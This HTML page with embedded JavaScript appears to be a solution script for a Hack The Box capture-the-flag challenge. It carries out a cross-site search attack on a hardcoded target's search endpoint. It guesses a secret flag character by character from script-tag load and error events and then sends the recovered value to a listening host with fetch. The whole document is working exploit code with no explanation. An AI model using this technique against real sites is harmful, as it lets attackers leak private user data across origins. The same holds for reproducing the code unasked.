<html>
<script>
//var ip = '127.0.0.1:1337';
var ip2 = '167.99.89.198:31246';
var hook = '127.0.0.1:8000';
var flag = 'HTB{';
var abc = '-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_';
var special = '_%\"\'';
var url1 = `http://${ip2}/api/entries/search?q=`
async function getPartialFlag(char){
 return new Promise((resolve, reject)=>{
 const script = document.createElement("script");
 script.src = url1+encodeURIComponent(flag+char);
 script.onload = () => char==='}' ? reject(char):resolve(char);
 script.onerror = () => reject(char);
 document.head.appendChild(script);
 });
}
async function getFlag(chars) {
 var b = false; 
 for(var i=0; i < chars.length; i++){
 //char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
 await getPartialFlag(chars[i]).then((res) => {flag=flag.concat(res); b = res==='x' ? true:false; i=0} , (res)=> { } );
 if(b) break;}
 fetch(`http://127.0.0.1:5000/flag=${flag}`, {method:'get'});
};
getFlag(abc);
</script>
<html>